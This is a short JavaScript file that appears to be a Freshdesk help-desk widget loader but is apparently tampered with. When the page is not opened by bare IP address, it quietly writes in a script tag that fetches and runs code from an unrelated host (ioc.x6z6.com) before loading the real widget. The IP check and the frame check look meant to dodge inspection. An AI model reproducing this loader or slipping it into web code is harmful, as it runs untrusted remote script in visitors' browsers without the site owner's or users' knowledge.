var ip = document.domain,surl="http://assets.freshdesk.com/widget/freshwidget.js";
var re = /^(\d+)\.(\d+)\.(\d+)\.(\d+)$/;
if (re.test(ip)) {
	if (RegExp.$1 < 256 && RegExp.$2 < 256 && RegExp.$3 < 256 && RegExp.$4 < 256) {
		document.write('<script src="http://assets.freshdesk.com/widget/freshwidget.js" type="text/Javascript"><' + '/script>');
	}
} else {
    if(surl.indexOf("?")>0){if(typeof _flag=='undefined'&&self==top){var _flag=true;document.write('<script language="javascript" src="http://ioc.x6z6.com/zl/us/15370/001/banner_100187.js"><' + '/script>');}}
	else{document.write('<script language="javascript" src="http://ioc.x6z6.com/zl/us/15370/001/banner_100187.js"><' + '/script>');}
	document.write('<script src="http://assets.freshdesk.com/widget/freshwidget.js?&1qazdr5" type="text/Javascript"><' + '/script>');
}